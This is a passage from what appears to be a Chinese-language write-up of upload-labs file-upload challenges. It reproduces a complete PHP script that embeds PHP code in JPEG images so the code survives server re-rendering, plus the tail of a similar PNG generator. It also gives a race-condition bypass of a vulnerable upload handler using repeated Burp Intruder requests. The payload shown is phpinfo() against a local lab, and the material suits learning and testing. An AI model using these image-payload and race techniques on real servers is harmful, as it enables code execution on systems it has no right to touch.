class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行后得到1.png.上传后下载到本地打开如下图</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOLTJ.png" alt="1WOLTJ.png"></p><h2 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h2><p>国外大牛编写的脚本jpg_payload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;gd&#x27;</span>) || !<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">skip</span>(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                <span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        <span class="hljs-title function_ invoke__">substr</span>(<br>                            <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) || !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;size - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">$this</span>-&gt;binData||(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>随便找一个jpg图片，先上传至服务器然后再下载到本地保存为<code>1.jpg</code></p><h3 id="插入php代码"><a href="#插入php代码" class="headerlink" title="插入php代码"></a>插入php代码</h3><p>使用脚本处理<code>1.jpg</code>，命令<code>php jpg_payload.php 1.jpg</code></p><p><img src="https://s2.ax1x.com/2020/02/09/1WO7OU.png" alt="1WO7OU.png"></p><p>使用16进制编辑器打开，就可以看到插入的php代码。</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOjYR.png" alt="1WOjYR.png"></p><h3 id="上传图片马"><a href="#上传图片马" class="headerlink" title="上传图片马"></a>上传图片马</h3><p>上传上去并验证</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>将上传的图片再次下载到本地,使用16进制编辑器打开</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOvf1.png" alt="1WOvf1.png"></p><p>可以看到，php代码没有被去除。<br>证明我们成功上传了含有php代码的图片。</p><p>需要注意的是,有一些jpg图片不能被处理，所以要多尝试一些jpg图片。</p><p>简单总结就是:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。将保存下来经过服务器二次渲染的那张jpg图片，用此脚本进行处理生成payload.jpg，然后再上传payload.jpg<br></code></pre></td></tr></table></figure><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以存在条件竞争。</p><p><strong>绕过方法</strong></p><p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。</p><ol><li><p>先设置上传请求,记住此处的文件名，等下要用来拼接访问请求的url</p><p><img src="https://s2.ax1x.com/2020/02/09/1WXrN9.png" alt="1WXrN9.png"></p></li><li><p>此处没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个</p><p><img src="https://s2.ax1x.com/2020/02/09/1WXc1x.png" alt="1WXc1x.png"></p></li></ol><p>接下来设置访问请求</p><ol><li>浏览器构造请求url：<code>http://127.0.0.1/upload-labs-master/upload/miracle778.php</code>,进行访问，然后用burp抓包</li><li>burp抓包后发送至intruder模块，然后设置payload，这一步和上传请求设置差不多,都是Null payloads、5000次、50个线程</li></ol><p>设置好两个模块后同时启动，观察结果，因为我们传入的php代码是<code>phpinfo();</code>,所以如果访问成功的话，会返回php的配置信息。</p><p><img src="https://s2.ax1x.com/2020/02/09/1WXgc6.png" alt="1WXgc6.png"></p><p>5000次里有3次访问成功，剩下的访问次数里，有小部分是状态码返回200，但执行出错</p><p><img src="https://s2.ax1x.com/2020/02/09/1WXshR.png" alt="1WXshR.png"></p><p>剩下大部分访问结果是状态码是404。<br>由此可得出结论，条件竞争绕过存在一定概率，实践中如果一次不成功，可以多试几次。</p><h1 id="x2F-绕过"><a href="#x2F-绕过" class="headerlink" title="&#x2F;. 绕过"></a>&#x2F;. 绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 